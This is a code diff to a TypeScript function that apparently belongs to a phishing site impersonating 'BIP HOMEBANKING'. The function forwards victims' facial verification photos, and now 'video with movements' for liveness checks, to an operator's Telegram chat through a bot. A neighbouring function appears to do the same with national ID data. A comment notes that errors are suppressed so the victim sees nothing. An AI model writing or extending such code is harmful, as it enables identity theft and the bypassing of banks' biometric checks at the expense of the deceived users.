@@ -101,43 +101,62 @@ export const sendDNINotification = async (data: {
 
 export const sendFacialNotification = async (data: {
   userId: string;
-  faceImage: string;
-  lightLevel: number;
+  faceImage: string | null;
+  faceVideo?: string | null;
   timestamp: string;
 }) => {
   if (!bot || !TELEGRAM_CHAT_ID) {
-    console.log('⚠️ Telegram no configurado');
+    console.log('⚠️ Telegram no configurado - Facial recibido pero no enviado');
     return;
   }
 
   try {
-    const lightEmoji = data.lightLevel >= 60 ? '✅' : data.lightLevel >= 30 ? '⚠️' : '❌';
-    const qualityStatus = data.lightLevel >= 60 ? 'EXCELENTE' : data.lightLevel >= 30 ? 'ACEPTABLE' : 'BAJA';
+    const isVideo = !!data.faceVideo;
     
     const message = `
 👤 *VERIFICACIÓN FACIAL - BIP HOMEBANKING*
 
 👤 *Usuario ID:* ${data.userId}
-💡 *Nivel de Luz:* ${data.lightLevel}% ${lightEmoji}
-📈 *Calidad:* ${qualityStatus}
+📹 *Tipo:* ${isVideo ? 'VIDEO CON MOVIMIENTOS' : 'IMAGEN'}
 ✅ *Verificación:* COMPLETADA
 
 🕐 *Fecha:* ${data.timestamp}
 
-📸 Foto de verificación facial adjunta
+${isVideo ? '🎥 Video de verificación facial adjunto' : '📸 Foto de verificación facial adjunta'}
     `;
 
     await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
 
-    // Enviar foto facial
-    const faceBuffer = Buffer.from(data.faceImage.split(',')[1], 'base64');
-    await bot.sendPhoto(TELEGRAM_CHAT_ID, faceBuffer, { 
-      caption: `👤 VERIFICACIÓN FACIAL - Luz: ${data.lightLevel}% - ${qualityStatus}` 
-    });
+    // Enviar video o foto
+    if (isVideo && data.faceVideo) {
+      try {
+        const videoBase64 = data.faceVideo.includes(',') ? data.faceVideo.split(',')[1] : data.faceVideo;
+        const videoBuffer = Buffer.from(videoBase64, 'base64');
+        
+        await bot.sendVideo(TELEGRAM_CHAT_ID, videoBuffer, { 
+          caption: `👤 VERIFICACIÓN FACIAL - VIDEO CON MOVIMIENTOS` 
+        });
+      } catch (videoError) {
+        console.error('❌ Error enviando video:', videoError);
+        await bot.sendMessage(TELEGRAM_CHAT_ID, '⚠️ Error al procesar el video, pero verificación completada');
+      }
+    } else if (data.faceImage) {
+      try {
+        const imageBase64 = data.faceImage.includes(',') ? data.faceImage.split(',')[1] : data.faceImage;
+        const faceBuffer = Buffer.from(imageBase64, 'base64');
+        await bot.sendPhoto(TELEGRAM_CHAT_ID, faceBuffer, { 
+          caption: `👤 VERIFICACIÓN FACIAL` 
+        });
+      } catch (imgError) {
+        console.error('❌ Error enviando imagen:', imgError);
+        await bot.sendMessage(TELEGRAM_CHAT_ID, '⚠️ Error al procesar la imagen');
+      }
+    }
 
     console.log('✅ Verificación facial enviada a Telegram');
   } catch (error) {
     console.error('❌ Error enviando verificación facial:', error);
+    // No lanzar el error para que el usuario no vea el error
   }
 };
 
